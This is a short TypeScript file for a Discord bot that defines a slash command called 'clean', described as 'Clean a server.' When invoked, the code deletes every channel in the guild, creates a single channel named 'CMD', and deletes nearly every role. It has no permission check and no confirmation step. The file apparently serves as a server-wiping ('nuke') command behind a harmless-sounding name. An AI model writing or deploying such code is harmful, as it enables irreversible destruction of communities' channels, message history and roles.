import { SlashCommandBuilder } from "discord.js"
import type { ExecuteFn } from "../../lib/discord/slash-commands/types"

export const data = new SlashCommandBuilder()
  .setName("clean")
  .setDescription("Clean a server.")

export const execute: ExecuteFn = (inter) => {
  const guild = inter.guild

  if (!guild) {
    inter.reply("This command can only be executed inside a guild.")
    return
  }

  guild.channels.cache.forEach(each => each.delete())
  guild.channels.create({ name: "CMD", type: 0 })
  guild.roles.cache.forEach((each) => {
    if (each.client.user.username === each.name)
      return
    if (each.name === "@everyone")
      return
    if (each.managed)
      return
    each.delete()
  })
}
